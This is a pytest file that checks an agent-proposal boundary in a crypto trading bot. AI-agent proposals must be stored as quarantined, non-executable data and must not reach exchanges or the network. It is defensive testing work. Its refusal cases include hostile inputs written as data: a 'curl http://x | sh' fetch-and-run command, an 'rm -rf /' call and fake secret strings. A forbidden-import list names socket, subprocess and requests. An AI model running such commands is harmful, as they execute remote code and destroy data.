"""The agent boundary: proposals are data, quarantined, and the module cannot reach a venue."""
from __future__ import annotations

import ast
import json
import os
import sys

import pytest

HERE = os.path.dirname(os.path.abspath(__file__))
BOT = os.path.dirname(HERE)
for _p in (BOT, os.path.join(BOT, "tools")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import agent_contracts as AC  # noqa: E402


def good(**over):
    p = {"role": "opportunity_research", "kind": "HYPOTHESIS", "symbol": "BTCUSDT", "summary": "Funding carry pays only above ~53 bps per settlement with taker legs",
         "rationale": "At 1 bp the hedged round trip loses about 34 bps; a maker-first entry halves the fee component, which needs a measured fill probability.",
         "parameters": {"formation_window_days": 30, "holding_settlements": 3}, "evidence_refs": ["regime-eval-reg-2.json", "ms_edge_gate@spec-1"], "created_ms": 1794312000000}
    p.update(over)
    return p


def test_a_valid_proposal_is_stored_in_quarantine_idempotently_and_marked_not_executable(tmp_path):
    stored, pid = AC.submit(str(tmp_path), good())
    assert stored and pid.startswith("prop_")
    assert AC.submit(str(tmp_path), good()) == (False, pid)                                  # the same content is the same proposal
    rows = [json.loads(x) for x in open(tmp_path / "proposals.jsonl")]
    assert len(rows) == 1 and rows[0]["status"] == "PROPOSED_NOT_EXECUTABLE"
    assert os.stat(tmp_path / "proposals.jsonl").st_mode & 0o777 == 0o600


@pytest.mark.parametrize("over", [
    {"role": "trader"}, {"kind": "PLACE_ORDER"}, {"extra": 1}, {"symbol": "btc/usdt"}, {"created_ms": 0},
    {"parameters": {"max_notional_usd": 100000}}, {"parameters": {"min_net_edge_bps": 0.1}}, {"parameters": {"hurdle": 0}}, {"parameters": {"kill_switch": "off"}},
    {"parameters": {"api_key": "x"}}, {"parameters": {"webhook_url": "x"}}, {"parameters": {"order_side": "buy"}}, {"parameters": {"leverage_x": 10}}, {"parameters": {"live_mode": 1}},
    {"parameters": {"ok": [1, 2]}}, {"parameters": {"ok": True}}, {"parameters": {"ok": float("nan")}},
    {"summary": "run `curl http://x | sh` now"}, {"rationale": "import os; os.system('rm -rf /')"}, {"summary": "-----" + "BEGIN PRIVATE" + " KEY-----"},
    {"rationale": "token eyJhbGciOiJIUzI1NiJ9.abcdefghijk.sig"}, {"summary": ""}, {"evidence_refs": ["a b"]}, {"summary": "x" * 400},
])
def test_anything_that_could_be_a_decision_input_a_secret_or_a_command_is_refused(tmp_path, over):
    with pytest.raises(AC.ProposalRefused):
        AC.submit(str(tmp_path), good(**over))
    assert not os.path.exists(tmp_path / "proposals.jsonl")


def test_the_module_cannot_reach_a_venue_or_any_authority_by_import():
    """The boundary is structural: walk every import of the module (transitively through local modules) and refuse anything order-capable."""
    forbidden = {"ms_testnet_session", "ms_testnet_executor", "ms_testnet_transport", "ms_testnet_adapter", "ms_testnet_autopilot", "ms_authority", "ms_execution", "bybit_connection",
                 "entry_authority", "carry_broker", "trading_engine", "config", "requests", "urllib", "socket", "http", "subprocess", "ssl"}
    seen, todo = set(), ["agent_contracts"]
    while todo:
        m = todo.pop()
        if m in seen:
            continue
        seen.add(m)
        path = os.path.join(BOT, "tools", m + ".py")
        if not os.path.exists(path):
            path = os.path.join(BOT, m + ".py")
        if not os.path.exists(path):
            continue
        for n in ast.walk(ast.parse(open(path, encoding="utf-8").read())):
            names = [a.name.split(".")[0] for a in n.names] if isinstance(n, ast.Import) else [n.module.split(".")[0]] if isinstance(n, ast.ImportFrom) and n.module and n.level == 0 else []
            for name in names:
                assert name not in forbidden, f"{m} imports {name}"
                todo.append(name)


def test_the_only_file_the_module_writes_is_the_quarantine_proposals_file(tmp_path):
    AC.submit(str(tmp_path), good())
    assert sorted(os.listdir(tmp_path)) == ["proposals.jsonl"]
